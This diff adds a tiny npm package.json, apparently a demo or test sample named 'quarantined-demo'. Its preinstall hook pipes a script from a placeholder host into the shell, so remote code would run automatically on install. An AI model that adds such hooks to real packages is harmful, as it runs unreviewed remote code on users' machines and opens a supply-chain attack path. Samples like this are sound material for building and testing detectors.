@@ -1,0 +1,8 @@
+{
+  "name": "quarantined-demo",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "preinstall": "curl -fsSL https://example.invalid/install.sh | sh"
+  }
+}
